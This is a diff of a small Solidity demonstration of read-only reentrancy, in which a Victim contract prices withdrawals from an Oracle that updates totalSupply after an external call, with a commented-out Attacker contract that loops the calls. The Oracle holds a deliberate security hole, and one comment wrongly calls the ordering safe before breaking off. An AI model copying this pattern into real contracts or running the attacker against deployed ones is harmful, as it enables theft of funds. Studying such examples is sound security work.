@@ -1,32 +1,21 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IAlpha {
-    function totalETHView() external view returns (uint256);
-    function totalSupplyView() external view returns (uint256);
-    function work(address strategy) external payable;
-}
-
 interface IStrategy {
     function execute() external;
 }
 
-interface IRari {
-    function withdraw() external returns (uint256);
-}
 
+contract Victim {
+    Oracle public o;
 
-// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }
-
-contract A is IRari {
-    IAlpha public alpha;
-
-    constructor(address _alpha) {
-        alpha = IAlpha(_alpha);
+    constructor(address _o) {
+        o = Oracle(_o);
     }
 
-    function withdraw() external returns (uint256) {
-        uint256 rate = alpha.totalETHView() * 1e18 / alpha.totalSupplyView();
+
+    function withdraw() external returns (uint256) { // even if the victim correctly implements the reentracy guard, the attack still succeed
+        uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
         uint256 amountETH = rate * 1000 / 1e18;
 
         //payable(msg.sender).transfer(amountETH);
@@ -39,11 +28,11 @@ contract A is IRari {
     receive() external payable {}
 }
 
-// this is the VULNERABLE CONTRACT
-contract B is IAlpha {
+// THIS is the contract vulnerable to reentrancy
+contract Oracle {
     uint256 public totalETH;
     uint256 public totalSupply;
-    bool private flag;
+    bool private flag = false;
 
     modifier nonReentrant() {
         require(!flag, "Locked");
@@ -55,7 +44,7 @@ contract B is IAlpha {
     function work(address strategy) nonReentrant external payable {
         totalETH += msg.value;
         IStrategy(strategy).execute();
-        totalSupply += msg.value;
+        totalSupply += msg.value;  // side-effect AFTER external call is safe because 
     }
 
     function totalETHView() external view returns (uint256) {
@@ -66,21 +55,22 @@ contract B is IAlpha {
     }
 }
 
-/*
-contract C is IStrategy {
-    IRari public rari;
-    IAlpha public alpha;
+// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }
 
-    constructor(address _rari, address _alpha) {
-        rari = IRari(_rari);
-        alpha = IAlpha(_alpha);
-    }
+// contract Attacker is IStrategy {
+//     Victim public v;
+//     Oracle_ree public o;
 
-    function execute() external {
-        rari.withdraw();
-    }
+//     constructor(address payable _v, address _o) {
+//         v = Victim(_v);
+//         o = Oracle_ree(_o);
+//     }
 
-    receive() external payable {
-        alpha.work(address(this));
-    }
-}*/
+//     function execute() external {
+//         v.withdraw();
+//     }
+
+//     receive() external payable {
+//         o.work(address(this));
+//     }
+// }
